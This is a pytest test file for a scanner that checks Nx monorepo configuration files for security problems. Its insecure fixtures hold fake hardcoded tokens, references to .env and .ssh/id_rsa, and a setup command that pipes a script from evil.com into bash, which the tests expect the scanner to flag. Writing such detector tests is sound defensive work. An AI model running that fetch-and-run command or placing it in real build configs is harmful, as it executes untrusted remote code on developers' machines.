"""Tests for NxAnalyzer."""

from pathlib import Path

from devai.nx_analyzer import NxAnalyzer, NxFinding


INSECURE_NX = """\
{
  "$schema": "./node_modules/nx/schemas/nx-schema.json",
  "nxCloudAccessToken": "nxct_hardcoded_cloud_token_abc123",
  "namedInputs": {
    "default": ["{projectRoot}/**/*", ".env", ".ssh/id_rsa"],
    "production": ["default"]
  },
  "targetDefaults": {
    "build": {
      "cache": true,
      "inputs": ["production", "credentials.json"],
      "outputs": ["{projectRoot}/dist"]
    },
    "deploy": {
      "cache": false,
      "options": {
        "env": {
          "GITHUB_TOKEN": "ghp_hardcoded_token_12345",
          "API_KEY": "sk-live-secret-key"
        }
      }
    }
  },
  "tasksRunnerOptions": {
    "default": {
      "runner": "nx-cloud",
      "options": {
        "accessToken": "nxct_runner_token_secret",
        "url": "http://nx-cloud.example.com"
      }
    }
  }
}
"""

INSECURE_PROJECT = """\
{
  "name": "my-app",
  "targets": {
    "build": {
      "executor": "@nx/webpack:webpack",
      "inputs": [".env", "src/**"],
      "options": {
        "api_key=hardcoded-secret-token-12345": true
      }
    },
    "setup": {
      "executor": "nx:run-commands",
      "options": {
        "command": "curl https://evil.com/install.sh | bash"
      }
    }
  }
}
"""

HARDENED_NX = """\
{
  "$schema": "./node_modules/nx/schemas/nx-schema.json",
  "namedInputs": {
    "default": ["{projectRoot}/**/*", "sharedGlobals"],
    "production": ["default"]
  },
  "targetDefaults": {
    "build": {
      "cache": true,
      "inputs": ["production", "^production"],
      "outputs": ["{projectRoot}/dist"]
    },
    "test": {
      "cache": true,
      "inputs": ["default", "^production"]
    }
  }
}
"""


class TestNxAnalyzer:
    def test_detects_insecure_nx_json(self, tmp_path: Path):
        (tmp_path / "nx.json").write_text(INSECURE_NX, encoding="utf-8")
        analyzer = NxAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "nx_cloud_token" in kinds
        assert "sensitive_path" in kinds
        assert "insecure_http" in kinds
        assert "sensitive_env" in kinds
        assert "cache_disabled" in kinds
        assert analyzer.stats.high_severity >= 3

    def test_detects_insecure_project_json(self, tmp_path: Path):
        app_dir = tmp_path / "apps" / "my-app"
        app_dir.mkdir(parents=True)
        (app_dir / "project.json").write_text(INSECURE_PROJECT, encoding="utf-8")
        analyzer = NxAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "sensitive_path" in kinds
        assert "curl_pipe_shell" in kinds
        assert "hardcoded_secret" in kinds

    def test_hardened_config_passes(self, tmp_path: Path):
        (tmp_path / "nx.json").write_text(HARDENED_NX, encoding="utf-8")
        analyzer = NxAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = NxAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Nx configs: none found"

    def test_generate_hardened_config(self):
        config = NxAnalyzer(".").generate_hardened_config()
        assert "namedInputs" in config
        assert "targetDefaults" in config
        assert "cacheableOperations" in config

    def test_to_context_includes_findings(self, tmp_path: Path):
        (tmp_path / "nx.json").write_text(INSECURE_NX, encoding="utf-8")
        analyzer = NxAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Nx analysis:" in context
        assert "nx_cloud_token" in context or "hardcoded" in context

    def test_finding_format(self):
        finding = NxFinding(
            kind="test",
            severity="high",
            message="test message",
            path="nx.json",
            lineno=1,
        )
        assert "[high]" in finding.format()
        assert "nx.json:1" in finding.format()
